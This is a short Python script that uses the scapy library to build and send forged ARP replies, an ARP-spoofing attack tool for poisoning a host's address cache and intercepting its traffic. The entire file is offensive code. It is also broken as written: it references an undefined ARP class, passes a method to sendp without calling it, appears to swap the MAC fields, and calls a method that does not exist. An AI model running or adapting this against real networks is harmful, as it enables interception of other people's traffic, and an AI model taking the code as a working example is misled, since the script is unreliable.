import sys
import scapy.all

DEFAULT_INTERFACE = 'eth0'


class ArpSpoofer:
    def __init__(self, dst_mac, dst_addr, who_has_addr):
        self.dst_mac = dst_mac
        self.src_mac = scapy.all.get_if_hwaddr(DEFAULT_INTERFACE)
        self.dst_addr = dst_addr
        self.who_has_addr = who_has_addr
    
    def spoof_arp_response(self):
        print('Sending ARP response packet')
        scapy.all.sendp(self._packet, iface=DEFAULT_INTERFACE)
        print('ARP reponse sent')

    def _packet(self):
        return scapy.all.ARP(op=ARP.is_at, hwdst=self.src_mac, hwsrc=self.dst_mac, pdst=self.who_has_addr, psrc=self.dst_addr)


if __name__ == '__main__':
    dst_mac = sys.argv[1]
    dst_addr = sys.argv[2]
    who_has_addr = sys.argv[3]
    mock = ArpSpoofer(dst_mac, dst_addr, who_has_addr)

    mock.send_packet()

